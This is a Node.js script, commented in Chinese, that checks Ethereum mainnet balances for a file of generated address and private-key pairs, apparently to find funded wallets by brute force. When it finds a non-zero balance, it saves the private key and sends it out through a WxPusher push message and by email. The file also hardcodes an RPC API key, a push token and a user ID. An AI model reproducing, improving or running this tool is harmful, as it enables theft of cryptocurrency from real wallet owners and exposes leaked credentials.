const fs = require('fs');
const ethers = require('ethers');
const axios = require('axios');
const sendEmail = require('./email'); // 

const provider = new ethers.providers.WebSocketProvider(
    'wss://eth-mainnet.nodereal.io/ws/v1/f68176b4c3114346a72c544403f65ae3'
);

// 
const addresses = fs
    .readFileSync('1.txt', 'utf8')
    .split('\n')
    .map((val) => val.split(','))
    .filter((val) => val[0] && val[1]);

const totalAddresses = addresses.length;
let counter = 0;

function checkAndCreateCounterFile() {
    if (!fs.existsSync('count.txt')) {
        fs.writeFileSync('count.txt', '0');
    }
}

function readCounterFromFile() {
    return parseInt(fs.readFileSync('count.txt'), 10);
}

function updateCounter(counter) {
    fs.writeFileSync('count.txt', counter.toString());
}

function saveToTextFile(address, privateKey) {
    fs.appendFileSync('88.txt', `${address},${privateKey}\n`);
}

const wxPusherToken = 'AT_4Old4OHsS90WxhuXW4jnrxBv6Ro4pQLf';

async function sendWxPusherMessage(title, content, uids = []) {
    try {
        await axios.post('http://wxpusher.zjiecode.com/api/send/message', {
            appToken: wxPusherToken,
            content,
            summary: title,
            contentType: 1,
            uids,
            url: ''
        });
    } catch (error) {
        console.error('Error sending WxPusher message:', error);
    }
}

async function queryAddresses() {
    const startIndex = readCounterFromFile();
    for (let i = startIndex; i < addresses.length; i++) {
        const startTime = Date.now();
        const address = addresses[i][0];
        const privateKey = addresses[i][1];
        const balance = await provider.getBalance(address);
        const formattedBalance = ethers.utils.formatEther(balance);
        const roundedBalance = parseFloat(formattedBalance).toFixed(7);
        const endTime = Date.now();
        const elapsedTime = endTime - startTime;

        counter = i + 1;
        if (balance.gt(0)) {
            console.log(`（${counter}/${totalAddresses}）地址: ${address}  用时：${elapsedTime} 毫秒 余额：\x1b[32m${roundedBalance} ETH\x1b[0m`);
            saveToTextFile(address, privateKey);
            const uids = ['UID_a74XG9KK8OMBcMxRbm3uodWXf7nq'];
            sendWxPusherMessage('Hit ETH wallet-git', `ETH address：${address}，\nThe private key：${privateKey}，\nThe balance is：${roundedBalance} ETH`, uids);
            sendEmail(address, balance, privateKey); // 
        } else {
            console.log(`（${counter}/${totalAddresses}）地址: ${address}  用时：${elapsedTime} 毫秒 余额：${roundedBalance} ETH`);
        }

        updateCounter(counter); // 
    }

    if (counter >= totalAddresses) { // 检查是否所有地址都已查询
        console.log('\n                                                   查询完成，已清空1.txt，请重新生成');
        updateCounter(0); // 将 `count.txt` 设置为 `0`
        fs.writeFileSync('1.txt', ''); // 清空 `1.txt`
        process.exit(0); // 结束程序
    }
}

(async () => {
    checkAndCreateCounterFile(); // 确保 `count.txt` 存在
    counter = readCounterFromFile(); // 读取 `count.txt`
    await queryAddresses(); // 查询地址
})();
